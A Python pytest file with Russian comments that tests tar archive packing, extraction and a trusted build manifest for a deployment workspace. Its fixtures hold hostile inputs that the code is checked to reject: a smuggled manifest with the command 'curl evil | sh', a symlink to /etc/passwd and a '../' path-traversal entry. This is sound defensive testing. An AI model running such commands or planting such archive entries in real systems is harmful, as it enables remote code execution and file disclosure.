"""Unit: source.tgz pack/extract + trusted build-манифест (.build.json).

read_build_manifest выбирает trusted-член (первый regular), pack/extract отвергают
дубликат манифеста, дерево материализуется без манифеста на диске, fallback к дефолтам.
materialize_tree prefix-guard отвергает путь-сосед <root>-evil.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

import pytest

from app.deploy import workspace
from app.deploy.workspace import (
    BuildManifest,
    materialize_tree,
    pack_source_tgz,
    read_build_manifest,
    safe_extract_tgz,
)
from app.schemas.agent_output import ValidatedFile, ValidatedTree

_MANIFEST_NAME = ".build.json"


def _tree(command="npm ci && vite build", output_dir="dist"):  # noqa: ANN001, ANN201
    return ValidatedTree(
        files=(
            ValidatedFile("package.json", "utf8", b'{"name":"s"}'),
            ValidatedFile("index.html", "utf8", b"<html></html>"),
            ValidatedFile("src/main.js", "utf8", b"x"),
        ),
        entry="index.html",
        build_command=command,
        build_output_dir=output_dir,
    )


# --- round-trip ---


def test_pack_then_read_manifest_roundtrip_nondefault():
    # Недефолтная команда без `npm ci` сохраняется пословно через pack→read
    # (нормализация npm ci→install проверяется в test_build_command_normalize).
    tree = _tree(command="npm install && npm run build", output_dir="out")
    data = pack_source_tgz(tree)
    manifest = read_build_manifest(data)
    assert manifest == BuildManifest(command="npm install && npm run build", output_dir="out")


def test_pack_then_extract_no_manifest_on_disk(tmp_path: Path):
    tree = _tree()
    data = pack_source_tgz(tree)
    safe_extract_tgz(data, tmp_path)
    assert (tmp_path / "index.html").read_bytes() == b"<html></html>"
    assert (tmp_path / "src" / "main.js").is_file()
    # Манифест НЕ материализуется как файл проекта.
    assert not (tmp_path / _MANIFEST_NAME).exists()


# --- trusted-манифест: первый regular-член, даже при подменённом втором ---


def _pack_with_smuggled_manifest(trusted: dict, smuggled: dict) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for payload in (trusted, smuggled):
            data = json.dumps(payload).encode()
            info = tarfile.TarInfo(name=_MANIFEST_NAME)
            info.size = len(data)
            info.type = tarfile.REGTYPE
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def test_read_manifest_picks_first_trusted_member_not_smuggled():
    data = _pack_with_smuggled_manifest(
        trusted={"command": "vite build", "output_dir": "dist"},
        smuggled={"command": "curl evil | sh", "output_dir": "/etc"},
    )
    manifest = read_build_manifest(data)
    assert manifest.command == "vite build"
    assert manifest.output_dir == "dist"


def test_extract_rejects_duplicate_manifest():
    data = _pack_with_smuggled_manifest(
        trusted={"command": "vite build", "output_dir": "dist"},
        smuggled={"command": "evil", "output_dir": "x"},
    )
    with pytest.raises(ValueError, match="duplicate build manifest"):
        safe_extract_tgz(data, Path("ignored"))


def test_pack_rejects_tree_file_colliding_with_manifest():
    # Дерево с файлом .build.json (если бы прошло мимо валидатора) → ValueError при упаковке.
    tree = ValidatedTree(
        files=(
            ValidatedFile("package.json", "utf8", b"{}"),
            ValidatedFile(_MANIFEST_NAME, "utf8", b"{}"),
        ),
        entry="package.json",
        build_command="vite build",
        build_output_dir="dist",
    )
    with pytest.raises(ValueError, match="collides with build manifest"):
        pack_source_tgz(tree)


# --- fallback к дефолтам ---


def test_read_manifest_missing_returns_defaults():
    # tgz без манифеста (старый формат) → дефолты контракта.
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        data = b"<html></html>"
        info = tarfile.TarInfo(name="index.html")
        info.size = len(data)
        info.type = tarfile.REGTYPE
        tar.addfile(info, io.BytesIO(data))
    manifest = read_build_manifest(buffer.getvalue())
    assert manifest == BuildManifest(command="npm install && vite build", output_dir="dist")


def test_read_manifest_corrupt_returns_defaults():
    manifest = read_build_manifest(b"not a tgz at all")
    assert manifest == BuildManifest(command="npm install && vite build", output_dir="dist")


# --- safe_extract rejects non-regular ---


def test_extract_rejects_symlink_member(tmp_path: Path):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        info = tarfile.TarInfo(name="evil-link")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/passwd"
        tar.addfile(info)
    with pytest.raises(ValueError, match="non-regular tar entry"):
        safe_extract_tgz(buffer.getvalue(), tmp_path)


def test_extract_rejects_traversal_member(tmp_path: Path):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        data = b"x"
        info = tarfile.TarInfo(name="../escape.txt")
        info.size = len(data)
        info.type = tarfile.REGTYPE
        tar.addfile(info, io.BytesIO(data))
    with pytest.raises(ValueError, match="escapes dest"):
        safe_extract_tgz(buffer.getvalue(), tmp_path)


# --- materialize_tree prefix-guard ---


def test_materialize_tree_writes_files(tmp_path: Path):
    ws = tmp_path / "ws"
    materialize_tree(_tree(), ws)
    assert (ws / "index.html").read_bytes() == b"<html></html>"
    assert (ws / "src" / "main.js").is_file()


def test_materialize_tree_prefix_guard_rejects_sibling(tmp_path: Path, monkeypatch):
    """Путь-сосед <root>-evil должен отвергаться prefix-guard'ом (_is_within)."""
    ws = tmp_path / "ws"
    ws.mkdir()

    # Подменяем _is_within так, чтобы убедиться: guard вызывается на каждый файл и
    # его отказ приводит к ValueError. Здесь — прямая проверка самого guard'а на
    # соседнем пути <root>-evil (общий префикс строки, но НЕ вложенность).
    root = ws.resolve()
    sibling = Path(str(root) + "-evil") / "x.js"
    assert workspace._is_within(root, sibling) is False
    # И вложенный путь проходит.
    assert workspace._is_within(root, root / "ok.js") is True
